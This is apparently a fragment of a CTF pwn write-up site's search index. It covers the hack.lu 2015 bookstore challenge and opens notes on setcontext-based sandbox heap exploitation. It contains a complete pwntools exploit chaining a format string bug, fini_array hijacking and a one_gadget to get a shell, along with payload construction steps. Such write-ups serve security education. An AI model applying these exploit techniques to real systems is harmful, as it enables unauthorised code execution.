\u5730\u5740\u51fa\u7684\u51fd\u6570\uff0c\u4e0d\u8fc7\u53ea\u80fd\u5229\u7528\u4e00\u6b21\uff08\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f\uff09\u3002 \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u7b2c\u4e00\u8f6e\u6cc4\u9732\u5730\u5740\u7684\u540c\u65f6\uff0c\u4fee\u6539 .fini_array \u7684\u5730\u5740\u4e3a main \u51fd\u6570\u5730\u5740\uff0c\u8ba9\u7a0b\u5e8f\u91cd\u65b0\u8fd0\u884c\u4e00\u6b21\u3002main \u51fd\u6570\u5730\u5740\u6613\u77e5\uff0c\u5173\u952e\u662f .fini_array \u5730\u5740\u600e\u4e48\u627e\u3002 \u52a8\u6001\u94fe\u63a5\u4e0e\u9759\u6001\u94fe\u63a5\u67e5\u627e\u548c\u5229\u7528\u6709\u5dee\u522b\uff0c\u4e3a\u4e86\u7bc7\u5e45\u5c06\u4e24\u8005\u533a\u522b\u653e\u5728\u6700\u540e\u3002\u5bf9 64 \u4f4d\u9759\u6001\u7a0b\u5e8f\u52ab\u6301 fini_array \u6709\u5174\u8da3\u53ef\u4ee5\u770b\u770b\uff1a \u52ab\u6301 64 \u4f4d fini_array \u8fdb\u884c ROP \u653b\u51fb","title":"\u52ab\u6301 fini_array"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#way-1","text":"IDA \u4e2d Ctrl+S \u67e5\u627e .fini_array \u5730\u5740\uff0c\u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u6570\u7ec4\u7a7a\u95f4\u5927\u5c0f\u4e3a 8 \u5b57\u8282\uff0c\u53ea\u80fd\u653e\u4e00\u4e2a\u5730\u5740\uff0c\u8fd9\u662f\u4e0e\u9759\u6001\u7a0b\u5e8f\u7684\u4e00\u4e2a\u533a\u522b\uff08\u9759\u6001\u6709\u4e24\u4e2a\u5730\u5740\uff09\u3002","title":"Way 1"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#way-2","text":"\u7528 gdb \u8c03\u8bd5\u7a0b\u5e8f\uff0c\u8f93\u5165 elf \u67e5\u627e .fini_array \u8981\u7d20\u5177\u5907\u4f46\u662f\u9047\u5230\u4e00\u4e2a\u95ee\u9898\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5185\u5bb9\u662f\u5b58\u653e\u5728\u5806\u4e0a\uff0c\u6808\u4e0a\u9762\u53ea\u6709\u8be5\u5806\u7684\u6307\u9488\u800c\u5df2\u3002\u7c7b\u4f3c\u9898\u76ee\uff1actf-wiki \u7684 \u5806\u4e0a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e \u3002 \u8fd9\u9053\u9898\u76ee\u6211\u4eec\u4e0d\u641e\u6808\u8fc1\u79fb\u5230\u5806\u4e0a\u9762\uff0c\u800c\u662f\u5229\u7528\u83dc\u5355\u7684\u5947\u602a\u8f93\u5165\u957f\u5ea6\uff0c\u5c06\u5730\u5740\u5199\u5165\u5230\u6808\u4e0a\u3002 # \u4e3a\u4e86\u5bf9\u9f50\u524d\u9762\u586b\u51458\u5b57\u8282\u7528\u6765\u653e\u83dc\u5355\u9009\u9879\uff0cfini_array\u504f\u79fb\u4e3a13 # \u6cc4\u9732libc\u53ef\u4ee5\u7528__libc_start_main\u4e5f\u53ef\u4ee5\u548c\u6211\u4e00\u6837\u81ea\u5df1\u5f80\u6808\u4e0a\u5199\u4e00\u4e2a payload2 = '5' * 8 + p64 ( fini_array ) + p64 ( free_got ) p . recvuntil ( \"5: Submit \\n \" ) p . sendline ( payload2 ) \u6cc4\u9732 libc \u5730\u5740\u548c\u52ab\u6301 fini_array payload \u76ee\u524d\u6784\u9020\uff1a payload1 = \" %2617c %13$hn\" + '|' + \"%14$s\" payload1 = payload1 . ljust ( 0x74 , 'a' ) . ljust ( 0x88 , ' \\x00 ' ) payload1 += p64 ( 0x151 ) edit ( 1 , payload1 )","title":"Way 2"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#main","text":"\u5230\u8fd9\u91cc\u6211\u4eec\u5c31\u83b7\u53d6\u4e86 libc_base \u5730\u5740\u5e76\u4e14\u8fdb\u5165\u4e86\u7b2c\u4e8c\u6b21\u7684 main \u51fd\u6570\u3002\u4e0b\u4e00\u6b65\u5c31\u662f\u5982\u4f55\u5229\u7528\u4e86\u3002 \u5c31 free got \u8868\u6539\u4e3a onegadget \uff1f\u5728\u8fd9\u91cc\u4e0d\u884c\uff0c\u56e0\u4e3a\u4fee\u6539\u73a9\u4e4b\u540e\u9700\u8981\u89e6\u53d1\uff0c\u4e5f\u5c31\u662f\u518d\u4e00\u6b21\u8fdb\u5165 main \u51fd\u6570\u89e6\u53d1 free \u51fd\u6570\u3002\u7b2c\u4e8c\u6b21\u8fdb\u5165 main \u51fd\u6570\u5b9e\u9645\u4e0a\u662f\u5728 __libc_csu_fini \u8fd9\u4e2a\u9000\u51fa\u51fd\u6570\u4e2d\u8c03\u7528 fini_array \u6570\u7ec4\u4e2d\u5b58\u50a8\u7684\u51fd\u6570\uff08main\uff09\uff0c\u5f53\u6267\u884c\u5b8c main \uff0c\u5c31\u4f1a\u7ee7\u7eed\u5b8c\u6210\u9000\u51fa\u51fd\u6570\uff0c\u7136\u540e\u6b63\u5e38\u9000\u51fa\u7a0b\u5e8f\u3002 \u8fd9\u91cc\u6709\u4e24\u4e2a\u601d\u8def\uff1a \u540c\u7b2c\u4e00\u6b21 mian \u4e2d\uff0c\u6cc4\u9732\u51fa\u6808\u5730\u5740\uff0c\u901a\u8fc7\u8c03\u8bd5\u83b7\u53d6\u5230\u7b2c\u4e8c\u6b21 main \u7684\u8fd4\u56de\u5730\u5740\u4e0e\u6cc4\u9732\u6808\u5730\u5740\u7684\u504f\u79fb\uff0c\u5c31\u53ef\u4ee5\u83b7\u53d6\u5230 main rip \u7684\u6808\u5730\u5740\uff0c\u6211\u4eec\u5bf9\u6b64\u8fdb\u884c\u4fee\u6539\u3002 \u4fee\u6539\u9000\u51fa\u51fd\u6570\u5f53\u4e2d\u67d0\u4e2a\u51fd\u6570\u7684 got \u8868\uff0c\u5f53\u5b8c\u6210\u9000\u51fa\u51fd\u6570\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u5c31\u4f1a getshell\u3002 \u7b2c\u4e8c\u79cd\u601d\u8def\u662f\u6709\u51e0\u6b21\u6bd4\u8d5b\u51fa\u73b0\u8fc7\u8fd9\u79cd\u5229\u7528\u65b9\u6cd5\uff0c\u4f46\u6ca1\u6709\u5728\u8fd9\u9053\u9898\u76ee\u4e0a\u5c1d\u8bd5\uff0c\u4e3b\u8981\u662f\u592a\u8d39\u52b2\u4e86\u3002\u8fd9\u9053\u9898\u5c31\u7528\u7b2c\u4e00\u79cd\u65b9\u6cd5\uff0c\u5c31\u662f\u9700\u8981\u6211\u4eec\u6cc4\u9732\u51fa \u6808\u5730\u5740 \uff0c\u7136\u540e\u56e0\u4e3a\u6808\u7ed3\u6784\u56fa\u5b9a\uff0c\u6240\u4ee5\u901a\u8fc7\u504f\u79fb\u7b97\u51fa\u7b2c\u4e8c main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u3002 \u901a\u8fc7\u8c03\u8bd5\u67e5\u770b\u7b2c\u4e00\u4e2a main \u51fd\u6570\u7684\u6808\u7a7a\u95f4\u7ed3\u6784\u4f53\uff1a \u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u65f6\u5019\u628a\u8fd9\u4e2a\u5730\u5740\u4e5f\u6cc4\u9732\u51fa\u6765\uff1a payload1 = \" %2617c %13$hn\" + '|' + \"%14$s\" + '-' + \"%24$p\" payload1 = payload1 . ljust ( 0x74 , 'a' ) . ljust ( 0x88 , ' \\x00 ' ) payload1 += p64 ( 0x151 ) edit ( 1 , payload1 ) \u518d\u6b21\u901a\u8fc7\u8c03\u8bd5\u627e\u5230\u7b2c\u4e8c\u6b21 main \u51fd\u6570\u8fd4\u56de\u5730\u5740\uff0c\u7136\u540e\u8ba1\u7b97\u56fa\u5b9a\u504f\u79fb\uff1a 0x7ffea45d8980 - 0x7ffea45d887a = 0x106 \u6240\u4ee5\u5f97\u51fa\u8ba1\u7b97\u516c\u5f0f\uff1a # ret_addr \u4e3a\u6cc4\u9732\u5730\u5740 attack_addr = ret_addr - 0x106 \u7b2c\u4e8c\u6b21\u8fdb\u5165 main \u51fd\u6570\u7684\u5229\u7528\u601d\u8def\u5c31\u51fa\u6765\u4e86\uff0c\u548c\u7b2c\u4e00\u6b21\u8fdb\u5165\u4e00\u6837\uff0c\u5148\u91ca\u653e chunk2 \u9020\u6210 overlapping \u5806\u91cd\u53e0\uff0c\u63a7\u5236 dest \u5185\u5bb9\u4ece\u800c\u63a7\u5236\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5185\u5bb9\u3002\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4fee\u6539\u7b2c\u4e8c\u6b21 main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4e3a onegadget \u3002","title":"\u4fee\u6539 main \u51fd\u6570\u8fd4\u56de\u5730\u5740"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#exp_1","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : books.py from pwn import * context . log_level = 'debug' p = process ( \"./books\" ) elf = ELF ( \"./books\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) def command ( cmd ): p . recvuntil ( \"5: Submit \\n \" ) p . sendline ( str ( cmd )) def edit ( cmd , content ): command ( cmd ) p . recvuntil ( \"order: \\n \" ) p . sendline ( content ) def free ( cmd ): command ( cmd + 2 ) free_got = elf . got [ 'free' ] fini_array = 0x6011B8 main_addr = 0x400A39 # ====round1==== # free book2 \u653e\u5165 unsortedbin free ( 2 ) # \u4fee\u6539 fini_array \u4e3a main # \u6cc4\u9732 libc_base # \u6cc4\u9732 stack \u5730\u5740 payload1 = \" %2617c %13$hn\" + '|' + \"%14$s\" + '-' + \"%24$p\" payload1 = payload1 . ljust ( 0x74 , 'a' ) . ljust ( 0x88 , ' \\x00 ' ) payload1 += p64 ( 0x151 ) edit ( 1 , payload1 ) # \u4ece\u83dc\u5355\u9009\u9879\u5c06fini_array\u548cfree_got\u5199\u5165\u5230\u6808\u4e0a payload2 = '5' * 8 + p64 ( fini_array ) + p64 ( free_got ) p . recvuntil ( \"5: Submit \\n \" ) p . sendline ( payload2 ) p . recvuntil ( \"|\" ) p . recvuntil ( \"|\" ) p . recvuntil ( \"|\" ) # \u5904\u7406libc\u5730\u5740 free_addr = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) log . info ( \"free_addr:\" + hex ( free_addr )) libc_base = free_addr - libc . symbols [ 'free' ] log . info ( \"libc_base:\" + hex ( libc_base )) onegadget = libc_base + 0x45226 log . info ( \"onegadget:\" + hex ( onegadget )) # \u5904\u7406\u6808\u5730\u5740 p . recvuntil ( \"-\" ) ret_addr = int ( p . recv ( 14 ), 16 ) log . info ( \"ret_addr:\" + hex ( ret_addr )) attack_addr = ret_addr - 0x106 log . info ( \"attack_addr:\" + hex ( attack_addr )) # ====round2==== # \u540c round1 free ( 2 ) # \u5904\u7406\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u586b\u5145\u5b57\u8282\u6570\uff0c\u5904\u7406\u9ad8\u5730\u5740\u503c\u5c0f\u4e8e\u4f4e\u5730\u5740\u60c5\u51b5 one_1 = onegadget & 0xffff log . info ( \"one_1:\" + hex ( one_1 )) one_2 = onegadget >> 16 & 0xffff log . info ( \"one_2:\" + hex ( one_2 )) if one_1 > one_2 : one_2 = one_2 + 0x10000 - one_1 else : one_2 -= one_1 # \u4fee\u6539\u7b2c\u4e8c\u6b21main\u8fd4\u56de\u5730\u5740 payload4 = \"% {} c%13$hn\" . format ( one_1 ) + \"% {} c%14$hn\" . format ( one_2 ) payload4 = payload4 . ljust ( 0x74 , 'c' ) . ljust ( 0x88 , ' \\x00 ' ) payload4 += p64 ( 0x151 ) edit ( 1 , payload4 ) #gdb.attach(p) payload3 = '5' * 8 + p64 ( attack_addr ) + p64 ( attack_addr + 2 ) p . recvuntil ( \"5: Submit \\n \" ) p . sendline ( payload3 ) p . interactive ()","title":"exp"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#_18","text":"hack.lu 2015 bookstore writeup 2015-hacklu-bookstore","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#_19","text":"","title":"\u8865\u5145\u603b\u7ed3"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#fini_array_1","text":"\u9996\u5148 fini_array \u662f __libc_csu_fini \u51fd\u6570\u91cc\u9762\u4f1a\u7528\u7684\u4e00\u4e2a\u5217\u8868\uff0c\u5f53\u7a0b\u5e8f\u9000\u51fa\u65f6\u4f1a\u8c03\u7528\u8fd9\u4e2a\u6570\u7ec4\u5b58\u653e\u7684\u4e00\u4e2a\u6216\u4e24\u4e2a\u51fd\u6570\uff0c\u8c03\u7528\u5b8c\u6210\u540e\u624d\u7ee7\u7eed\u5b8c\u6210\u9000\u51fa\u51fd\u6570\uff0c\u8fd9\u65f6\u624d\u662f\u771f\u6b63\u9000\u51fa\u7a0b\u5e8f\u3002","title":"\u600e\u4e48\u627e fini_array \uff1f"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#64","text":"fini_array \u6570\u7ec4\u957f\u5ea6\u4e3a 0x10 \u5b57\u8282\uff0c\u91cc\u9762\u653e\u4e86\u4e24\u4e2a\u51fd\u6570\u5730\u5740\uff0c\u9000\u51fa main \u51fd\u6570\u4f1a\u5148\u6267\u884c fini_array[1] \uff0c\u7136\u540e\u6267\u884c fini_array[0] \u3002 \u5728 \u52ab\u6301 64 \u4f4d\u9759\u6001\u7a0b\u5e8f fini_array \u8fdb\u884c ROP \u653b\u51fb \u91cc\u9762\u63a5\u89e6\u7684\u662f 64 \u4f4d\u9759\u6001\u7f16\u8bd1\u7684\u7a0b\u5e8f\uff0c\u7a0b\u5e8f\u662f\u6ca1\u6709\u7b26\u53f7\u8868\u7684\uff0c\u5bfb\u627e fini_array \u65b9\u6cd5\u662f\uff1a \u9996\u5148 readelf -h \u7a0b\u5e8f\u540d \u67e5\u770b\u7a0b\u5e8f\u52a0\u8f7d\u5165\u53e3\u5730\u5740\u3002 gdb \u8c03\u8bd5\u5c06\u65ad\u70b9\u6253\u5728\u5165\u53e3\u5730\u5740 \uff0c\u7136\u540e\u627e\u5230\u6709\u4e09\u4e2a\u4f20\u53c2\u7684 mov \u6307\u4ee4\uff0cmov r8 \u5c31\u662f __libc_csu_fini \u7684\u5730\u5740\uff1a .text:0000000000401A60 public start .text:0000000000401A60 start proc near ; DATA XREF: LOAD:0000000000400018\u2191o .text:0000000000401A60 ; __unwind { .text:0000000000401A60 xor ebp, ebp .text:0000000000401A62 mov r9, rdx .text:0000000000401A65 pop rsi .text:0000000000401A66 mov rdx, rsp .text:0000000000401A69 and rsp, 0FFFFFFFFFFFFFFF0h .text:0000000000401A6D push rax .text:0000000000401A6E push rsp .text:0000000000401A6F mov r8, offset sub_402BD0 ; fini .text:0000000000401A76 mov rcx, offset loc_402B40 ; init .text:0000000000401A7D mov rdi, offset main .text:0000000000401A84 db 67h .text:0000000000401A84 call __libc_start_main .text:0000000000401A8A hlt .text:0000000000401A8A ; } // starts at 401A60 .text:0000000000401A8A start endp \u7136\u540e x /20i addr \u67e5\u770b\u8be5\u5730\u5740\u5f00\u59cb\u7684\u6c47\u7f16\uff0c\u627e\u5230 lea rbp,[rip+0xb***1] # 0x4***f0 \uff0c\u8fd9\u4e2a\u5730\u5740\u5c31\u662f fini_array[1] \u7684\u5730\u5740\uff1a pwndbg> x/20i 0x402bd0 0x402bd0 <__libc_csu_fini>: push rbp 0x402bd1 <__libc_csu_fini+1>: lea rax, [ rip+0xb24e8 ] # 0x4***c0 0x402bd8 <__libc_csu_fini+8>: lea rbp, [ rip+0xb24d1 ] # 0x4***b0 0x402bdf <__libc_csu_fini+15>: push rbx 0x402be0 <__libc_csu_fini+16>: sub rax,rbp 0x402be3 <__libc_csu_fini+19>: sub rsp,0x8 0x402be7 <__libc_csu_fini+23>: sar rax,0x3 0x402beb <__libc_csu_fini+27>: je 0x402c06 <__libc_csu_fini+54> 0x402bed <__libc_csu_fini+29>: lea rbx, [ rax-0x1 ] 0x402bf1 <__libc_csu_fini+33>: nop DWORD PTR [ rax+0x0 ] 0x402bf8 <__libc_csu_fini+40>: call QWORD PTR [ rbp+rbx*8+0x0 ] 0x402bfc <__libc_csu_fini+44>: sub rbx,0x1 0x402c00 <__libc_csu_fini+48>: cmp rbx,0xffffffffffffffff 0x402c04 <__libc_csu_fini+52>: jne 0x402bf8 <__libc_csu_fini+40> 0x402c06 <__libc_csu_fini+54>: add rsp,0x8 0x402c0a <__libc_csu_fini+58>: pop rbx 0x402c0b <__libc_csu_fini+59>: pop rbp 0x402c0c <__libc_csu_fini+60>: jmp 0x48f52c <_fini>","title":"64 \u4f4d\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#64_1","text":"fini_array \u6570\u7ec4\u957f\u5ea6\u4e3a 0x8 \u5b57\u8282\uff0c\u91cc\u9762\u653e\u4e86\u4e00\u4e2a\u51fd\u6570\u5730\u5740\uff0c\u9000\u51fa main \u51fd\u6570\u4f1a\u6267\u884c fini_array[0]\u3002 gdb \u8f93\u5165 elf \u627e .fini_array \uff0c\u5f00\u59cb\u5730\u5740\u5c31\u662f fini_array[0] \u6216\u8005 IDA ctrl+s \u627e .fini_array \u5206\u6bb5 \uff1a 64 \u4f4d\u4e2d\u53ea\u6709 fini_array[0] \uff0c\u6ca1\u6709 fini_array[1] \uff0c\u4e5f\u5c31\u662f\u53ea\u80fd\u8fd0\u884c\u5199\u5165 fini_array \u4e00\u6b21\uff0c\u7136\u540e\u5c31\u6b63\u5e38\u9000\u51fa\u4e86\u3002\u65e0\u6cd5\u50cf\u9759\u6001\u7f16\u8bd1\u90a3\u6837\u91cd\u590d\u8c03\u7528\u3002","title":"64 \u4f4d\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/#_20","text":"\u52a8\u6001\u7a0b\u5e8f\u76ee\u524d\u5c31\u9047\u5230 2015 hacklu bookstore \u8fd9\u4e00\u9898\uff0c\u592a\u83dc\u4e86\u603b\u7ed3\u4e0d\u51fa\u89c4\u5f8b\u3002 \u9759\u6001\u7a0b\u5e8f\u57fa\u672c\u4e0a\u5957\u8def\u662f\u52ab\u6301 fini_array + \u5faa\u73af\u5199\u5165\uff0c\u5c06 ROP \u94fe\u5e03\u7f6e\u5230 fini_array + 0x10 \uff0c\u5199\u5165\u5b8c\u6210\u540e\u5c06\u6808\u8fc1\u79fb\u5230 fini_array + 0x10 \u6267\u884c ROP \u94fe\u3002\u9759\u6001\u7a0b\u5e8f\u7684\u603b\u7ed3\u53ef\u4ee5\u770b\u770b \u6dc7\u6dc7\u5e08\u5085\u6587\u7ae0 \u3002 fastbin \u4e0d\u4e0e\u7269\u7406\u5730\u5740\u76f8\u90bb fastbin \u5408\u5e76\uff0c\u4e0d\u4e0e top chunk \u5408\u5e76 \u21a9 \u5206\u914d\u7684\u5b89\u5168\u68c0\u67e5\u673a\u5236\uff0c\u8bf7\u770b malloc \u51fd\u6570\u4ecb\u7ecd \u21a9","title":"\u9759\u6001\u52a8\u6001\u5229\u7528\u65b9\u5f0f\u5c0f\u7ed3"},{"location":"Pwn/glibc-heap/%E6%B2%99%E7%9B%92%E5%A0%86%E6%BA%A2%E5%87%BA/","text":"\u6c99\u76d2\u5806\u6ea2\u51fa\u5b66\u4e60 \u00b6 \u5728\u590d\u73b0 SWPUCTF2020 jailbreak \u9047\u5230\u6253\u5f00\u6c99\u76d2\u5806\u6ea2\u51fa\u9898\u76ee\uff0c\u8fd9\u6761\u9898\u76ee\u5b9e\u9645\u4e0a\u8fd8\u6709 chroot \u9003\u9038\uff0c\u8fd9\u4e2a\u5148\u653e\u540e\u9762\u3002\u6c99\u76d2\u5806\u6ea2\u51fa\u5229\u7528\u65b9\u6cd5\u6838\u5fc3\u662f setcontext() \uff0c\u4ee5\u8fd9\u4e2a\u70b9\u641c\u5bfb\u5176\u4ed6\u540c\u7c7b\u9898\u76ee\u3002\u5e74\u524d\u7684\u9ad8\u6821\u6218\u5f79 lgd \uff0c\u4e03\u6708\u4efd DASCTF bigbear \u3002 setcontext \u00b6 // stdlib/setcontext.c #include <errno.h> #include <ucontext.h> int setcontext ( const ucontext_t * ucp ){ \u2026\u2026 }; \u5176\u4f5c\u7528\u662f\u7528\u6237\u4e0a\u4e0b\u6587\u7684\u8bbe\u7f6e\uff0c\u6240\u4ee5\u6211\u4eec\u5728\u53ef\u4ee5\u5c0f\u8303\u56f4\u63a7\u5236\u6267\u884c\u6d41\uff0c\u5df2\u77e5 libc_base \u4f46\u4e0d\u8db3\u4ee5\u5b8c\u6210\u6211\u4eec\u7684\u76ee\u6807\u65f6\uff0c\u53ef\u4ee5\u5148\u8df3 setcontext+53 \u6765\u6269\u5927\u63a7\u5236\u8303\u56f4\u3002\u7b80\u5355\u6765\u8bf4\u5c31\u662f**\u901a\u8fc7 setcontext \u63a7\u5236\u5bc4\u5b58\u5668\u7684\u503c**\uff0c\u6709\u70b9 srop \u7684\u601d\u60f3\u3002 setcontext+53 \u907f\u514d crash \u00b6 libc 2.27 \u4e0b\u5b8c\u6574 setcontext \u5982\u4e0b\uff1a <setcontext>: push rdi <setcontext+1>: lea rsi, [ rdi+0x128 ] <setcontext+8>: xor edx,edx <setcontext+10>: mov edi,0x2 <setcontext+15>: mov r10d,0x8 <setcontext+21>: mov eax,0xe <setcontext+26>: syscall <setcontext+28>: pop rdi <setcontext+29>: cmp rax,0xfffffffffffff001 <setcontext+35>: jae 0x7ffff7a7d520 <setcontext+128> <setcontext+37>: mov rcx,QWORD PTR [ rdi+0xe0 ] <setcontext+44>: fldenv [ rcx ] <setcontext+46>: ldmxcsr DWORD PTR [ rdi+0x1c0 ] <setcontext+53>: mov rsp,QWORD PTR [ rdi+0xa0 ] <setcontext+60>: mov rbx,QWORD PTR [ rdi+0x80 ] <setcontext+67>: mov rbp,QWORD PTR [ rdi+0x78 ] <setcontext+71>: mov r12,QWORD PTR [ rdi+0x48 ] <setcontext+75>: mov r13,QWORD PTR [ rdi+0x50 ] <setcontext+79>: mov r14,QWORD PTR [ rdi+0x58 ] <setcontext+83>: mov r15,QWORD PTR [ rdi+0x60 ] <setcontext+87>: mov rcx,QWORD PTR [ rdi+0xa8 ] <setcontext+94>: push rcx <setcontext+95>: mov rsi,QWORD PTR [ rdi+0x70 ] <setcontext+99>: mov rdx,QWORD PTR [ rdi+0x88 ] <setcontext+106>: mov rcx,QWORD PTR [ rdi+0x98 ] <setcontext+113>: mov r8,QWORD PTR [ rdi+0x28 ] <setcontext+117>: mov r9,QWORD PTR [ rdi+0x30 ] <setcontext+121>: mov rdi,QWORD PTR [ rdi+0x68 ] <setcontext+125>: xor eax,eax <setcontext+127>: ret <setcontext+128>: mov rcx,QWORD PTR [ rip+0x356951 ] # 0x7ffff7dd3e78 <setcontext+135>: neg eax <setcontext+137>: mov DWORD PTR fs: [ rcx ] ,eax <setcontext+140>: or rax,0xffffffffffffffff <setcontext+144>: ret fldenv [rcx] \u6307\u4ee4\u4f1a\u9020\u6210\u7a0b\u5e8f\u6267\u884c\u7684\u65f6\u5019\u76f4\u63a5crash\uff0c\u6240\u4ee5\u8981\u907f\u5f00\u8fd9\u4e2a\u6307\u4ee4\uff0c\u8df3\u8f6c\u5230 setcontext+53 \u3002 \u90e8\u7f72\u5806\u6808\u7a7a\u95f4\u63a7\u5236\u5bf9\u5e94\u5bc4\u5b58\u5668 \u00b6 \u6c99\u76d2\u5806\u6ea2\u51fa\u9898\u76ee\u5229\u7528\u662f\u5c06 __free_hook \u52ab\u6301\u4e3a setcontext+53 \uff0c\u5f53 free \u5806\u5757\u65f6\u5806\u5730\u5740\u4f5c\u4e3a\u53c2\u6570\u653e\u5728 rdi \u4f20\u5165\u51fd\u6570\u4e2d\uff0c\u8fdb\u5165\u5230 setcontext \u5c31\u4f1a\u4ee5**\u5806\u5730\u5740**\u4f5c\u4e3a\u57fa\u5740\uff0c\u5c06\u4e0d\u540c\u504f\u79fb\u5730\u5740\u4e0a\u7684\u6570\u636e\u653e\u5165\u5bc4\u5b58\u5668\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u63a7\u5236**\u5806\u5730\u5740**\u540e\u9762\u7a7a\u95f4\u4e0a\u7684\u5185\u5bb9\u3002 \u6ce8\u610f\uff1a\u8fd9\u91cc\u63d0\u524d\u5e03\u7f6e\u7684\u6570\u636e\u5e76\u4e0d\u662f srop \u4e2d\u7684 frame\uff01\uff01\uff01\u5728\u5176\u4ed6\u9898\u76ee\u7684 wp \u4e2d\u4f7f\u7528 SigreturnFrame() \u662f\u65b9\u4fbf\u751f\u6210\u800c\u5df2\uff0c\u5e76\u4e0d\u662f\u8bf4\u660e\u586b\u8fdb\u53bb\u7684\u662f frame\u3002\u6bd4\u5982\uff1a frame.rdi=0x123456 \u6700\u540e 0x123456 \u662f\u8d4b\u503c\u5230 rsi <- mov rsi,QWORD PTR [rdi+0x70] \u6784\u9020 rsp \u65f6\u9700\u8981\u6ce8\u610f push rcx \u7684\u5f71\u54cd\uff0c\u5982\u679c rsp \u5730\u5740\u4e0d\u53ef\u8bbf\u95ee\uff0c\u7a0b\u5e8f\u5c31\u4f1a crash \u3002 libc 2.29 \u4e4b\u540e\u53d8\u5316 \u00b6 libc 2.27 \u4e0b setcontext\uff1a <setcontext+53>: mov rsp,QWORD PTR [ rdi+0xa0 ] <setcontext+60>: mov rbx,QWORD PTR [ rdi+0x80 ] <setcontext+67>: mov rbp,QWORD PTR [ rdi+0x78 ] <setcontext+71>: mov r12,QWORD PTR [ rdi+0x48 ] <setcontext+75>: mov r13,QWORD PTR [ rdi+0x50 ] <setcontext+79>: mov r14,QWORD PTR [ rdi+0x58 ] <setcontext+83>: mov r15,QWORD PTR [ rdi+0x60 ] <setcontext+87>: mov rcx,QWORD PTR [ rdi+0xa8 ] <setcontext+94>: push rcx <setcontext+95>: mov rsi,QWORD PTR [ rdi+0x70 ] <setcontext+99>: mov rdx,QWORD PTR [ rdi+0x88 ] <setcontext+106>: mov rcx,QWORD PTR [ rdi+0x98 ] <setcontext+113>: mov r8,QWORD PTR [ rdi+0x28 ] <setcontext+117>: mov r9,QWORD PTR [ rdi+0x30 ] <setcontext+121>: mov rdi,QWORD PTR [ rdi+0x68 ] <setcontext+125>: xor eax,eax <setcontext+127>: ret <setcontext+128>: mov rcx,QWORD PTR [ rip+0x398c61 ] <setcontext+135>: neg eax <setcontext+137>: mov DWORD PTR fs: [ rcx ] ,eax <setcontext+140>: or rax,0xffffffffffffffff <setcontext+144>: ret libc 2.30 \u4e0b setcontext\uff1a <setcontext+52>: fldenv [ rcx ] <setcontext+54>: ldmxcsr DWORD PTR [ rdx+0x1c0 ] <setcontext+61>: mov rsp,QWORD PTR [ rdx+0xa0 ] <setcontext+68>: mov rbx,QWORD PTR [ rdx+0x80 ] <setcontext+75>: mov rbp,QWORD PTR [ rdx+0x78 ] <setcontext+79>: mov r12,QWORD PTR [ rdx+0x48 ] <setcontext+83>: mov r13,QWORD PTR [ rdx+0x50 ] <setcontext+87>: mov r14,QWORD PTR [ rdx+0x58 ] <setcontext+91>: mov r15,QWORD PTR [ rdx+0x60 ] <setcontext+95>: test DWORD PTR fs:0x48,0x2 <setcontext+107>: je 0x7f4ea94d71c6 <setcontext+294> <setcontext+113>: mov rsi,QWORD PTR [ rdx+0x3a8 ] <setcontext+120>: mov rdi,rsi <setcontext+123>: mov rcx,QWORD PTR [ rdx+0x3b0 ] <setcontext+130>: cmp rcx,QWORD PTR fs:0x78 <setcontext+139>: je 0x7f4ea94d7165 <setcontext+197> <setcontext+141>: mov rax,QWORD PTR [ rsi-0x8 ] <setcontext+145>: and rax,0xfffffffffffffff8 <setcontext+149>: cmp rax,rsi <setcontext+152>: je 0x7f4ea94d7140 <setcontext+160> \u539f\u6765\u662f\u4ee5 rdi \u4f5c\u4e3a\u57fa\u5730\u5740\uff0c\u5728 libc 2.29 \u4e4b\u540e\u4ee5 rdx \u4f5c\u4e3a\u57fa\u5730\u5740\u3002 SWPUCTF2020 jailbreak \u00b6 \u57fa\u672c\u60c5\u51b5 \u00b6 [*] '/ctf/work/jailbreak' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 